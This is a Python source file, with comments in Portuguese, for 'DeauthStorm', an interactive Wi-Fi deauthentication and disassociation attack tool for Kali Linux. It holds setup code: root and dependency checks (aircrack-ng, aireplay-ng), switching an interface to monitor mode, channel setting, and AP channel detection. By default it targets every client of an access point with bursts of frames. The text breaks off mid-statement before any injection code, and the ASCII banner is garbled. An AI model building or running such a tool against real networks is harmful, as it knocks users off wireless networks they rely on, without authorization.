#!/usr/bin/env python3
"""
DeauthStorm - Ferramenta de Desautenticação Wi-Fi Interativa
Autor: DeepHat (Kindo)
Versão: 1.0.0
Sistema: Kali Linux (Debian-based)
Dependências: aircrack-ng, iw, macchanger, python3
"""

import os
import sys
import subprocess
import signal
import time
import re
import argparse
from datetime import datetime
from typing import List, Dict, Optional, Tuple
import threading

# ==============================================================================
# CONSTANTES E CONFIGURAÇÕES
# ==============================================================================

VERSION = "1.0.0"
DEFAULT_LOG_FILE = "/tmp/deauthstorm.log"
DEFAULT_CAPTURE_PREFIX = "/tmp/deauthstorm_capture"
DEFAULT_BURST_COUNT = 100
DEFAULT_INTERVAL = 5
DEFAULT_CHANNEL = None  # Auto-detect
DEFAULT_TARGET_MAC = None  # Todos os clientes

# Cores ANSI
class Color:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    
    # Cores primárias
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    
    # Cores escuras
    DARK_RED = '\033[31m'
    DARK_GREEN = '\033[32m'
    DARK_YELLOW = '\033[33m'
    DARK_BLUE = '\033[34m'
    DARK_MAGENTA = '\033[35m'
    DARK_CYAN = '\033[36m'
    DARK_WHITE = '\033[37m'
    
    # Cores de fundo
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'


def cprint(text: str, color: str = Color.WHITE, bold: bool = False) -> None:
    """Imprime texto com cor e formatação."""
    prefix = ""
    if bold:
        prefix += Color.BOLD
    prefix += color
    print(f"{prefix}{text}{Color.RESET}")


def cprint_line(text: str, color: str = Color.WHITE, bold: bool = False, 
                char: str = "─", length: int = 80) -> None:
    """Imprime uma linha decorativa com texto centralizado."""
    padding = max(0, (length - len(text) - 2) // 2)
    line = f"{char * padding} {text} {char * padding}"
    cprint(line, color, bold)


def cprint_banner() -> None:
    """Exibe o banner ASCII da ferramenta."""
    banner = f"""
{Color.CYAN}{Color.BOLD}
  ____  ____  ___  ____  ____  __  __    _    __  ____  _  __   _  __
 / ___||  _ \\ / _ \\/  _ \\|  _ \\ \\ \\/ /   / \\  |  |/  _ \\/ |/ /  | |/ /
| |  _| |_) |/ /\\\\ \\/ |  \\| |_) | \\/ /   / _ \\ | '|| | | | ' /   | ' / 
| |_| |  _  /| |/  \\| |__ |  __/   / \\  / ___ \\| | | |_| | . \\   . . \\
 \\___||_| |_|\\_/|_\\_\\____||_|     /_/  /_/   \\_\\_|  \\___/|_|\\_\\ _/|_|\\_\\
{Color.RESET}
{Color.MAGENTA}  ┌─────────────────────────────────────────────────────────────────────────┐
  │  DEAUTHSTORM v{VERSION} - Wi-Fi Deauthentication & Disassociation Tool   │
  │  Desenvolvido por: DeepHat (Kindo)                                       │
  │  Sistema: Kali Linux | Protocolo: IEEE 802.11                            │
  └─────────────────────────────────────────────────────────────────────────┘
{Color.RESET}
"""
    print(banner)


def cprint_separator(char: str = "─", length: int = 80) -> None:
    """Imprime um separador."""
    print(f"{Color.DIM}{char * length}{Color.RESET}")


def cprint_header(text: str, char: str = "═") -> None:
    """Imprime um cabeçalho formatado."""
    print(f"\n{Color.CYAN}{Color.BOLD}{char * 80}{Color.RESET}")
    cprint(f"  {text}", Color.CYAN, bold=True)
    print(f"{Color.CYAN}{Color.BOLD}{char * 80}{Color.RESET}\n")


# ==============================================================================
# CLASSES PRINCIPAIS
# ==============================================================================

class DeauthStorm:
    """Classe principal que gerencia toda a lógica da ferramenta."""
    
    def __init__(self):
        self.interface: Optional[str] = None
        self.ap_mac: Optional[str] = None
        self.channel: Optional[int] = None
        self.target_mac: Optional[str] = None
        self.burst_count: int = DEFAULT_BURST_COUNT
        self.interval: int = DEFAULT_INTERVAL
        self.frame_type: str = "deauth"  # "deauth" ou "disassoc"
        self.clients: List[Dict] = []
        self.is_running: bool = False
        self.capture_process: Optional[subprocess.Popen] = None
        self.log_file: str = DEFAULT_LOG_FILE
        self.stats: Dict = {
            "total_bursts": 0,
            "total_frames": 0,
            "start_time": None,
            "last_burst_time": None
        }
        self._setup_logging()
    
    def _setup_logging(self) -> None:
        """Configura o arquivo de log."""
        with open(self.log_file, 'a') as f:
            f.write(f"\n{'=' * 80}\n")
            f.write(f"DeauthStorm v{VERSION} iniciado em {datetime.now().isoformat()}\n")
            f.write(f"{'=' * 80}\n")
    
    def log(self, message: str, level: str = "INFO") -> None:
        """Registra mensagem no log e no console."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        color_map = {
            "INFO": Color.BLUE,
            "WARN": Color.YELLOW,
            "ERROR": Color.RED,
            "OK": Color.GREEN,
            "DEBUG": Color.DIM
        }
        color = color_map.get(level, Color.WHITE)
        cprint(f"[{timestamp}] [{level}] {message}", color)
        with open(self.log_file, 'a') as f:
            f.write(f"[{timestamp}] [{level}] {message}\n")
    
    # ==========================================================================
    # VERIFICAÇÕES E VALIDAÇÕES
    # ==========================================================================
    
    def check_root(self) -> bool:
        """Verifica se está rodando como root."""
        if os.geteuid() != 0:
            cprint("ERRO: Este script deve ser executado como root.", Color.RED, bold=True)
            cprint("Use: sudo python3 deauthstorm.py", Color.YELLOW)
            return False
        self.log("Executando como root.", "OK")
        return True
    
    def check_dependencies(self) -> bool:
        """Verifica se todas as dependências estão instaladas."""
        dependencies = [
            ("airodump-ng", "aircrack-ng", "Ferramenta de captura e análise Wi-Fi"),
            ("aireplay-ng", "aircrack-ng", "Ferramenta de replay e injeção de pacotes"),
            ("airmon-ng", "aircrack-ng", "Ferramenta de gerenciamento de modo monitor"),
            ("iw", "iw", "Ferramenta de configuração de interfaces Wi-Fi"),
            ("macchanger", "macchanger", "Ferramenta de alteração de MAC (opcional)")
        ]
        
        missing = []
        for cmd, package, desc in dependencies:
            if not self._command_exists(cmd):
                if package != "aircrack-ng" and not self._command_exists(package):
                    missing.append(f"{cmd} ({package})")
        
        if missing:
            cprint("DEPENDÊNCIAS FALTANTES:", Color.RED, bold=True)
            for dep in missing:
                cprint(f"  - {dep}", Color.YELLOW)
            cprint("\nInstale com: sudo apt-get install " + " ".join(set([d.split()[1] for d in missing])), Color.CYAN)
            return False
        
        self.log("Todas as dependências verificadas.", "OK")
        return True
    
    def _command_exists(self, command: str) -> bool:
        """Verifica se um comando existe no PATH."""
        return subprocess.run(["which", command], capture_output=True).returncode == 0
    
    def validate_mac(self, mac: str) -> bool:
        """Valida formato de endereço MAC."""
        mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$')
        return bool(mac_pattern.match(mac))
    
    def validate_channel(self, channel: str) -> Optional[int]:
        """Valida e converte canal para inteiro."""
        try:
            ch = int(channel)
            if 1 <= ch <= 165:
                return ch
            else:
                cprint(f"Canal inválido: {ch}. Deve ser entre 1 e 165.", Color.RED)
                return None
        except ValueError:
            cprint(f"Canal inválido: {channel}. Deve ser um número.", Color.RED)
            return None
    
    # ==========================================================================
    # OPERAÇÕES DE INTERFACE
    # ==========================================================================
    
    def list_interfaces(self) -> List[str]:
        """Lista todas as interfaces Wi-Fi disponíveis."""
        result = subprocess.run(
            ["iw", "dev"],
            capture_output=True, text=True
        )
        interfaces = []
        for line in result.stdout.splitlines():
            if line.startswith("Interface"):
                iface = line.split()[1]
                interfaces.append(iface)
        return interfaces
    
    def get_interface_mode(self, interface: str) -> str:
        """Obtém o modo atual da interface."""
        result = subprocess.run(
            ["iw", "dev", interface, "info"],
            capture_output=True, text=True
        )
        for line in result.stdout.splitlines():
            if "type" in line:
                return line.split()[-1]
        return "unknown"
    
    def ensure_monitor_mode(self, interface: str) -> bool:
        """Garante que a interface esteja em modo monitor."""
        current_mode = self.get_interface_mode(interface)
        
        if current_mode == "monitor":
            self.log(f"Interface {interface} já está em modo monitor.", "OK")
            return True
        
        self.log(f"Interface {interface} em modo {current_mode}. Ativando modo monitor...", "INFO")
        
        # Para a interface em modo managed
        subprocess.run(
            ["airmon-ng", "stop", interface],
            capture_output=True, text=True
        )
        
        # Inicia em modo monitor
        result = subprocess.run(
            ["airmon-ng", "start", interface],
            capture_output=True, text=True
        )
        
        if result.returncode != 0:
            self.log(f"Falha ao ativar modo monitor: {result.stderr}", "ERROR")
            return False
        
        # Aguarda estabilização
        time.sleep(2)
        
        # Verifica novamente
        new_mode = self.get_interface_mode(interface)
        if new_mode != "monitor":
            self.log(f"Falha: Interface ainda está em modo {new_mode}", "ERROR")
            return False
        
        self.log(f"Interface {interface} agora está em modo monitor.", "OK")
        return True
    
    def set_channel(self, interface: str, channel: int) -> bool:
        """Define o canal da interface."""
        result = subprocess.run(
            ["iw", "dev", interface, "set", "channel", str(channel)],
            capture_output=True, text=True
        )
        if result.returncode != 0:
            self.log(f"Falha ao definir canal {channel}: {result.stderr}", "ERROR")
            return False
        self.log(f"Canal {channel} definido na interface {interface}.", "OK")
        return True
    
    # ==========================================================================
    # DETECÇÃO E MONITORAMENTO
    # ==========================================================================
    
    def detect_ap_channel(self, ap_mac: str) -> Optional[int]:
        """Detecta o canal de um AP específico."""
        self.log(f"Detectando canal do AP {ap_mac}...", "INFO")
        
        # Usa airodump-ng para detectar o canal
        result = subprocess.run(
            ["airodump-ng", "--bssid", ap_mac, self.interface],
            capture_output=True, text=True, timeout=10
        )
        
        # Parse da saída do airodump-ng
        for line in result.stdout.splitlines():
            if ap_mac in line:
                # O canal está na 4ª coluna
                parts = line.split()
                if len(parts)